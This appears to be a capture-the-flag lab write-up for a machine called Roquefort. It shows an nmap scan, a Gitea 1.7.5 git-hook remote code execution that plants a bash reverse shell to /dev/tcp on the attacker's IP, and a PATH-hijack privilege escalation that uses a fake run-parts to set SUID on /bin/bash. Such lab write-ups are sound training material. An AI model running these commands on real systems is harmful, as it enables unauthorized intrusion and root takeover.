---
icon: ubuntu
---

# Roquefort - Intermediate

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn $ip -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-27 22:01 EDT
Nmap scan report for 192.168.110.67
Host is up (0.033s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5b
22/tcp   open   ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:77:6f:b1:ed:65:b5:ad:14:64:40:d2:24:d3:9c:0d (RSA)
|   256 a9:b4:4f:61:2e:2d:9d:4c:48:15:fe:70:8e:fa:af:b3 (ECDSA)
|_  256 92:56:eb:af:c9:34:af:ea:a1:cf:9f:e1:90:dd:2f:61 (ED25519)
53/tcp   closed domain
2222/tcp open   ssh     Dropbear sshd 2016.74 (protocol 2.0)
3000/tcp open   http    Golang net/http server
|_http-title: Gitea: Git with a cup of tea
| fingerprint-strings: 
|   GenericLines, Help: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=689f447a33bb1803; Path=/; HttpOnly
|     Set-Cookie: _csrf=Ss5AT9yx1CyUEYq0NfJlkuBkmaY6MTc1NjM0NjU5OTM5MjAxMzI1Nw%3D%3D; Path=/; Expires=Fri, 29 Aug 2025 02:03:19 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 28 Aug 2025 02:03:19 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|     navigator.serviceWorker.register('/serviceworker.js').then(function(registration) {
|   HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gitea=f9da7b8f5e5da1ce; Path=/; HttpOnly
|     Set-Cookie: _csrf=lvlRB8-tE579m0_TUIvRFFI2o9U6MTc1NjM0NjU5OTU5NDEyNzE0MQ%3D%3D; Path=/; Expires=Fri, 29 Aug 2025 02:03:19 GMT; HttpOnly
|     X-Frame-Options: SAMEORIGIN
|     Date: Thu, 28 Aug 2025 02:03:19 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta charset="utf-8">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Page Not Found - Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="/manifest.json" crossorigin="use-credentials">
|     <script>
|     ('serviceWorker' in navigator) {
|     window.addEventListener('load', function() {
|_    navigator.serviceWorker.register('/serviceworker.js').then(function(registration
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=8/27%Time=68AFB8E6%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,2836,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:\
SF:x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/;
SF:\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gitea=689f447a33bb1803;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=Ss5AT9yx1CyUEYq0NfJlkuB
SF:kmaY6MTc1NjM0NjU5OTM5MjAxMzI1Nw%3D%3D;\x20Path=/;\x20Expires=Fri,\x2029
SF:\x20Aug\x202025\x2002:03:19\x20GMT;\x20HttpOnly\r\nX-Frame-Options:\x20
SF:SAMEORIGIN\r\nDate:\x20Thu,\x2028\x20Aug\x202025\x2002:03:19\x20GMT\r\n
SF:\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data-suburl=\"\">\n\t<meta\x20
SF:charset=\"utf-8\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<meta\x20http-equiv=\"x-ua-compatib
SF:le\"\x20content=\"ie=edge\">\n\t<title>Gitea:\x20Git\x20with\x20a\x20cu
SF:p\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest
SF:\.json\"\x20crossorigin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x2
SF:0\('serviceWorker'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.add
SF:EventListener\('load',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnavi
SF:gator\.serviceWorker\.register\('/serviceworker\.js'\)\.then\(function\
SF:(registration\)\x20{\n\x20\x20\x20\x20\x20\x20\t\t\t\t\n\x20\x20\x20\x2
SF:0\x20\x20\t\t\t")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request")%r(HTTPOptions,156C,"HTTP/1\.0\x20404\x20Not\x
SF:20Found\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\
SF:x20lang=en-US;\x20Path=/;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_lik
SF:e_gitea=f9da7b8f5e5da1ce;\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csr
SF:f=lvlRB8-tE579m0_TUIvRFFI2o9U6MTc1NjM0NjU5OTU5NDEyNzE0MQ%3D%3D;\x20Path
SF:=/;\x20Expires=Fri,\x2029\x20Aug\x202025\x2002:03:19\x20GMT;\x20HttpOnl
SF:y\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Thu,\x2028\x20Aug\x2020
SF:25\x2002:03:19\x20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head\x20data-
SF:suburl=\"\">\n\t<meta\x20charset=\"utf-8\">\n\t<meta\x20name=\"viewport
SF:\"\x20content=\"width=device-width,\x20initial-scale=1\">\n\t<meta\x20h
SF:ttp-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\t<title>Page\x2
SF:0Not\x20Found\x20-\x20Gitea:\x20Git\x20with\x20a\x20cup\x20of\x20tea</t
SF:itle>\n\t<link\x20rel=\"manifest\"\x20href=\"/manifest\.json\"\x20cross
SF:origin=\"use-credentials\">\n\t\n\t<script>\n\t\tif\x20\('serviceWorker
SF:'\x20in\x20navigator\)\x20{\n\x20\x20\t\t\twindow\.addEventListener\('l
SF:oad',\x20function\(\)\x20{\n\x20\x20\x20\x20\t\t\tnavigator\.serviceWor
SF:ker\.register\('/serviceworker\.js'\)\.then\(function\(registration");
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.8 - 3.16 (92%), Linux 3.16 - 4.6 (91%), Linux 4.4 (90%), Synology DiskStation Manager 7.1 (Linux 4.4) (90%), Linux 2.6.32 - 3.10 (90%), Linux 5.0 - 5.14 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   31.26 ms 192.168.45.1
2   31.29 ms 192.168.45.254
3   35.14 ms 192.168.251.1
4   35.58 ms 192.168.110.67
```

### <mark style="color:$primary;">HTTP Port 3000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (2415).png" alt=""><figcaption></figcaption></figure>

We got a version at the bottom of the page let's look for an exploit

<figure><img src="../../.gitbook/assets/image (2416).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Gitea V 1.7.5 RCE</mark>

```
https://github.com/p0dalirius/CVE-2020-14144-GiTea-git-hooks-rce
```

Followed the manual exploitation steps listed in the git repo

Registered a user with username and password deimos

Create the repository and we go into **`Settings -> Git Hooks -> Post Receive Hook`** In this hook you can write a shell script that will be executed after receiving a new commit.

Create repo button

<figure><img src="../../.gitbook/assets/image (2417).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2418).png" alt=""><figcaption></figcaption></figure>

I named mine vuln

Now we go into **`Settings -> Git Hooks -> Post Receive Hook`.** In this hook you can write a shell script that will be executed after receiving a new commit.

```
#!/bin/bash

bash -i >& /dev/tcp/192.168.45.243/3000 0>&1 &
```

<figure><img src="../../.gitbook/assets/image (730).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (731).png" alt=""><figcaption></figcaption></figure>

Now I will create a temporary directory on our attacking machine, and push to the remote repository. It will trigger the `Post Receive Hook` script. So prep a listener as well

```
touch README.md
git init
git add README.md
git commit -m "Initial commit"
git remote add origin http://192.168.208.67:3000/deimos/Vuln.git
git push -u origin master
```

<figure><img src="../../.gitbook/assets/image (732).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (733).png" alt=""><figcaption></figcaption></figure>

We got a shell as chloe. I am going to create ssh login for chloe for a better shell

### <mark style="color:$primary;">Generating SSH key</mark>

<figure><img src="../../.gitbook/assets/image (734).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (735).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (736).png" alt=""><figcaption></figcaption></figure>

Chloe has write access to `/usr/local/bin` directory.&#x20;

We need root to run something on `/usr/local/bin` so that we can modify the binary.

### <mark style="color:$primary;">Pspy</mark>

<figure><img src="../../.gitbook/assets/image (737).png" alt=""><figcaption></figcaption></figure>

<mark style="color:yellow;">**THIS IS PATH PRIVESC! the run-parts is using relative PATH.**</mark>

<figure><img src="../../.gitbook/assets/image (738).png" alt=""><figcaption></figcaption></figure>

The run-parts binary is on **`/bin`**

<figure><img src="../../.gitbook/assets/image (739).png" alt=""><figcaption></figcaption></figure>

**`/usr/local/bin`** is on upper priority. We can create a malicious run-parts binary on /usr/local/bin and it will get executed as root.

```
echo -e '#!/bin/bash\n\nchmod +s /bin/bash' > /usr/local/bin/run-parts
```

```
chmod +x /usr/local/bin/run-parts
```

<figure><img src="../../.gitbook/assets/image (740).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (741).png" alt=""><figcaption></figcaption></figure>

```
/bin/bash -p
```

<figure><img src="../../.gitbook/assets/image (742).png" alt=""><figcaption></figcaption></figure>
